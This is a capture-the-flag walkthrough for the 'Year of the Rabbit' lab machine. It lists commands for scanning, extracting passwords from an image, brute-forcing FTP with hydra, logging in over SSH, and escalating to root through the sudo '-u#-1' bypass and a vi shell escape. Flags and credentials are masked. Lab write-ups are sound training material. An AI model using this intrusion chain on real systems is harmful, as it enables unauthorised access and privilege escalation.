# Year of the Rabbit

- What is the user flag?

	- `scilla port -target <TARGET_IP>`
	- `21, 22, 80` open.
	- `scilla dir -target <TARGET_IP>`
	- Visit `/assets/`.
	- In `style.css`:
	~~~
    	Take a look at the page: /*****************.php
	~~~
	- Turn off your javascript.
	- Looking at the actual request we can find a hidden folder `W********-qU/`.
	- Visit that folder and download `Hot_Babe.png`.
	- `strings Hot_Babe.png`
	- Copy the passwords in a txt file.
	- `hydra -t 8 -l ****** -P Hot.txt -vV <TARGET_IP> ftp`
	- `***********`
	- `ftp <TARGET_IP>`, enter username and password.
	- `get "Eli's Creds.txt"`
	- [here](https://www.splitbrain.org/_static/ook/)
	~~~
	User: eli
	Password: *************
	~~~
	- `ssh eli@<TARGET_IP>`, `yes` and enter pwd. 
	- `find / -name s3cr3t`
	- `cd /***/*****/s3cr3t/`
	- `ls -lah`
	- `cat .t*`
	- `su - gwendoline` and enter pwd.
	- `pwd`
	- `ls -lah`
	- `cat user.txt`
	- `**************************************`

- What is the root flag?

	- `sudo -l`
	- `sudo -u#-1 /usr/bin/vi /home/gwendoline/user.txt`
	- `:!sh`
	- `whoami`
	- `pwd`
	- `cd /root/`
	- `ls -alh`
	- `cat root.txt`
	- `********************************************`


